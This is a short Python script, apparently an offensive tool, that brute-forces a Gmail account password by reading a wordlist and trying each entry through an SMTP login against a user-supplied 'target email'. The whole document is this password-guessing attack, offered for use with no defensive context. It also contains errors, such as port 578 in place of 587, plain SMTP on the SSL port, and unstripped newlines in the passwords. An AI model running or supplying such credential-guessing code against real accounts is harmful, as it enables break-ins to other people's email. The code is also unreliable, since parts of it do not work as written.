import smtplib

ports = [465, 578]

user = input("enter target email : ")
passfile = input("enter wordlist : ")

for port in ports:
    print(port)
    try:
        smtpserver = smtplib.SMTP("smtp.gmail.com", port)
        smtpserver.ehlo()
        smtpserver.starttls()

    except smtplib.SMTPServerDisconnected:
        print(f"[!] connection closed via port {port}")
        exit(1)

passfile = open(passfile, "r")

for password in passfile:
    try:
        smtpserver.login(user, password)
        print("[+] password found : %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[!] password incorrect : %s" % password)
